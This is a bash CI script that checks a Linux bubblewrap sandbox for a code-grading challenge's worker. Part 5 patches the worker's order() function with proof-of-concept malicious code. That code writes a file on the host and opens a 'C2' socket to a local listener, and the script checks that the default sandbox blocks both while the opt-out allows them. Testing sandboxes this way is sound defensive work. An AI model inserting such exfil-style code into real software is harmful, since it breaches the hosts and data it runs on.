#!/usr/bin/env bash
# Linux runtime validation of the #47 local-worker sandbox.
#
# Proves on a real Linux host that: the workspace builds offline, all sandbox
# tests pass, the grader per-worker bubblewrap boundary works (PID 1, no default
# route, read-only input, hidden host paths, watchdog teardown), and — the #47
# fix — the LOCAL default actually sandboxes order(): a malicious order() that
# writes $HOME and opens a C2 socket gets zero exfil by default and succeeds
# only under the explicit SSI_ALLOW_UNSANDBOXED_WORKER=1 opt-out.
#
# Assumes: bubblewrap, cargo-deny (0.20.2), and python3 are installed;
# unprivileged user namespaces are enabled; a prepared offline tree
# (scripts/prepare-build.sh has run so vendor/ + generated manifests exist);
# and it runs as a NON-ROOT user (the parent and worker refuse root by design).
# On a non-Linux dev host, drive this through ci/linux-sandbox-check.docker.sh.
set -uo pipefail

ROOT="${1:-$PWD}"
cd "$ROOT" || { echo "cannot cd to repo root $ROOT"; exit 2; }
if [ "$(id -u)" -eq 0 ]; then
  echo "refusing to run as root — the trusted parent and worker require non-root"; exit 2
fi

FAIL=0
mark() { if [ "$1" -eq 0 ]; then echo "PASS: $2"; else echo "FAIL: $2"; FAIL=1; fi; }

export CARGO_TARGET_DIR="${CARGO_TARGET_DIR:-$ROOT/target}"
echo "linux-sandbox-check: uid=$(id -u) $(uname -m) $(. /etc/os-release 2>/dev/null; echo "${PRETTY_NAME:-}")"

# 1. Unprivileged bwrap can create the namespaces the worker sandbox needs.
SANITY=(bwrap --unshare-pid --unshare-net --dev /dev --proc /proc --tmpfs /)
for d in /lib /lib64 /usr/lib; do [ -e "$d" ] && SANITY+=(--ro-bind "$d" "$d"); done
SANITY+=(--ro-bind /usr /usr -- /usr/bin/echo ok)
"${SANITY[@]}" >/dev/null 2>&1; mark $? "unprivileged bwrap creates pid/net namespaces"

# 2. Offline build.
cargo build --release --workspace --offline --locked >/tmp/lsc-build.log 2>&1
mark $? "workspace builds offline+locked"
WORKER="$CARGO_TARGET_DIR/release/ssi-candidate-worker"
PARENT="$CARGO_TARGET_DIR/release/ssi-ordering-challenge"

# 3. Sandbox-relevant tests: the bin unit tests (sandbox::, watchdog::,
#    repo_root, incl. linux_local_default_*) and the security_boundary
#    integration test. Deliberately NOT the full `-p` suite: `time_cap`'s
#    normal_run drives the real portfolio over the full corpus under the 2 s
#    cap and is runner-speed flaky (issue #60) — a submission-perf concern, not
#    a sandbox one, with its own coverage in `security-regressions`.
cargo test --release --offline --locked --bin ssi-ordering-challenge >/tmp/lsc-test.log 2>&1 \
  && cargo test --release --offline --locked --test security_boundary >>/tmp/lsc-test.log 2>&1
mark $? "sandbox + watchdog + security_boundary tests"
grep -E "FAILED|panicked at" /tmp/lsc-test.log | head

# 4. Grader per-worker bubblewrap boundary.
SSI_GRADER_SANDBOX=bubblewrap SSI_CANDIDATE_WORKER="$WORKER" \
  "$PARENT" --grader --sandbox-self-check
mark $? "--grader --sandbox-self-check (PID1, no route, ro input, hidden host)"
SSI_GRADER_SANDBOX=bubblewrap SSI_CANDIDATE_WORKER="$WORKER" \
  "$PARENT" --grader --sandbox-timeout-self-check
mark $? "--grader --sandbox-timeout-self-check (watchdog teardown)"
SSI_CANDIDATE_WORKER="$WORKER" cargo test --release --offline --locked \
  -p ssi-ordering-challenge bubblewrap_timeout_tears_down_candidate_descendants -- --ignored \
  >/tmp/lsc-e2e.log 2>&1
mark $? "bwrap timeout e2e test"

# 5. LOCAL DEFAULT #47 proof: malicious order() exfil is blocked by default and
#    allowed only under the explicit opt-out.
cp src/ordering/mod.rs /tmp/lsc-mod.bak
python3 - "$PWD/src/ordering/mod.rs" <<'PY'
import sys
p=sys.argv[1]; s=open(p).read()
needle="    let n = pattern.n;\n    if n == 0 {\n        return Vec::new();\n    }"
poc='''    {
        let _ = std::fs::write(std::path::Path::new("/tmp/lsc_poc_fs"), b"exfil\\n");
        if let Ok(mut c) = std::net::TcpStream::connect("127.0.0.1:8923") {
            use std::io::Write as _; let _ = c.write_all(b"c2\\n");
        }
        return (0..pattern.n).collect();
    }
    #[allow(unreachable_code)]
'''
assert needle in s, "order() anchor not found"
open(p,"w").write(s.replace(needle, poc+needle, 1))
PY
cargo build --release -p ssi-candidate-worker --offline --locked >/tmp/lsc-poc.log 2>&1
mark $? "rebuild candidate with POC order()"

cat > /tmp/lsc-listener.py <<'PY'
import socket
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",8923)); s.listen(128)
f=open("/tmp/lsc-c2.log","a")
while True:
    c,_=s.accept(); c.recv(8); c.close(); f.write("hit\n"); f.flush()
PY
listen() { rm -f /tmp/lsc-c2.log; python3 /tmp/lsc-listener.py >/dev/null 2>&1 & LST=$!; sleep 1; }
unlisten() { kill "$LST" 2>/dev/null || true; sleep 0.3; }
hits() { [ -f /tmp/lsc-c2.log ] && wc -l </tmp/lsc-c2.log | tr -d ' ' || echo 0; }

rm -f /tmp/lsc_poc_fs; listen
SSI_CANDIDATE_WORKER="$WORKER" "$PARENT" --note "linux default sandbox" >/tmp/lsc-run-default.log 2>&1
unlisten
DEF_HITS=$(hits); DEF_FS=$([ -f /tmp/lsc_poc_fs ] && echo YES || echo NO)
grep -qE "^score" /tmp/lsc-run-default.log; DEF_RAN=$?
echo "default: c2=$DEF_HITS fs=$DEF_FS ran=$DEF_RAN"
{ [ "$DEF_HITS" = "0" ] && [ "$DEF_FS" = "NO" ] && [ "$DEF_RAN" -eq 0 ]; }
mark $? "default local run executes worker but BLOCKS network + host write"

rm -f /tmp/lsc_poc_fs; listen
SSI_ALLOW_UNSANDBOXED_WORKER=1 SSI_CANDIDATE_WORKER="$WORKER" \
  "$PARENT" --note "linux opt-out" >/tmp/lsc-run-optout.log 2>&1
unlisten
OUT_HITS=$(hits); OUT_FS=$([ -f /tmp/lsc_poc_fs ] && echo YES || echo NO)
grep -q "WARNING: SSI_ALLOW_UNSANDBOXED_WORKER=1" /tmp/lsc-run-optout.log; WARN=$?
echo "opt-out: c2=$OUT_HITS fs=$OUT_FS warn=$WARN"
{ [ "$OUT_HITS" -gt "0" ] && [ "$OUT_FS" = "YES" ] && [ "$WARN" -eq 0 ]; }
mark $? "opt-out ALLOWS exfil + warns (proves the sandbox is the blocker)"

cp /tmp/lsc-mod.bak src/ordering/mod.rs

# 6. Build-phase wrapper (Linux bubblewrap branch).
cargo build --release -p ssi-candidate-worker --offline --locked >/dev/null 2>&1
bash scripts/local-candidate-build.sh >/tmp/lsc-wrap.log 2>&1
mark $? "scripts/local-candidate-build.sh (bubblewrap build boundary)"
[ -x "$CARGO_TARGET_DIR/release/ssi-candidate-worker" ]; mark $? "wrapper staged release worker"

echo "========================================"
[ "$FAIL" -eq 0 ] && echo "ALL LINUX SANDBOX CHECKS PASSED" || echo "SOME LINUX SANDBOX CHECKS FAILED"
echo "========================================"
exit "$FAIL"
